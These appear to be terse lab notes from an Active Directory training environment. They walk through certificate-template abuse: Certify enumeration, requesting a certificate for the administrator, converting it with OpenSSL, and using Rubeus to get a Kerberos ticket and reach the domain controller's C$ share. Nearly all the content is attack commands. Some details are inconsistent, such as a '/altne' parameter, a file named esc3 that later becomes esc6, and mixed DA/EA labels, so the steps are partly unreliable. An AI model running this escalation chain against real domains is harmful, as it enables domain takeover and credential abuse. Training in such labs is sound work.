#### 1. Check Certs
```markdown
C:\AD\Tools>C:\AD\Tools\Certify.exe cas
```

#### 2. Find Users with Certs
```markdown
This means that we can request a certificate for ANY user from a template that allows enrollment for normal/low-privileged users.

C:\AD\Tools>C:\AD\Tools\Certify.exe find
```

#### 3. Request a Certificate for EA
```markdown
As a member of RDPUsers group, we can request a certificate for any user using CA-Integration template. Let's do it for DA. Use **/altne:moneycorp.local\administrator** in the below command for escalation to EA.

C:\AD\Tools>C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"CA-Integration" /altne:administrator
```

#### 4. Save Certificate Text to PEM and Convert PEM Using OpenSSL
```markdown
SecretPass@123

C:\AD\Tools>C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-DA.pfx
```

#### 5. Request TGT for EA
```markdown
C:\AD\Tools>C:\AD\Tools\Rubeus.exe asktgt /user:administrator /certificate:C:\AD\Tools\esc6-DA.pfx /password:SecretPass@123 /ptt
```

#### 6. Check Access
```markdown
net view \\dcne

net use * \\domain\c$
```
